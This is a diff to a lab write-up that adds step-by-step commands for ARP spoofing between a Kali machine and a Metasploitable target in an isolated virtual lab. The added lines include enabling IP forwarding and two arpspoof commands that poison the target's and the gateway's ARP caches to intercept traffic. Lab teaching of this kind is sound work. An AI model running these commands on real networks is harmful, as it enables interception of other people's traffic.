@@ -10,11 +10,22 @@ To study ARP spoofing in an isolated virtual lab and observe HTTP traffic exchan
 
 On Kali Linux, use `ip a` to confirm that the `eth0` interface is up and has the expected lab address.
 
+# Command: 
+```bash
+ip a
+```
+
 ![Step 1 Screenshot](images/ss1.png)
 
 ### Step 2: Check the Metasploitable Network
 
 Use `ip a` to identify the Metasploitable IP address and ping the gateway to check basic connectivity.
+
+# Commands: 
+```bash
+ip a
+ping -c 2 192.168.122.129
+```
 
 ![Step 2 Screenshot](images/ss2.png)
 
@@ -22,11 +33,22 @@ Use `ip a` to identify the Metasploitable IP address and ping the gateway to che
 
 Enable packet forwarding on Kali Linux, then run the ARP spoofing command. It sends ARP replies to the target, claiming that the gateway is at Kali's MAC address.
 
+# Commands: 
+```bash
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo arpspoof -i eth0 -t 192.168.122.128 192.168.122.129
+```
+
 ![Step 3 Screenshot](images/ss3.png)
 
 ### Step 4: Send False Victim Information to the Gateway
 
 In a second Kali terminal, run the reverse ARP spoofing command. This sends replies to the gateway, claiming that Metasploitable is at Kali's MAC address.
+
+# Command: 
+```bash
+sudo arpspoof -i eth0 -t 192.168.122.129 192.168.122.128
+```
 
 ![Step 4 Screenshot](images/ss4.png)
 
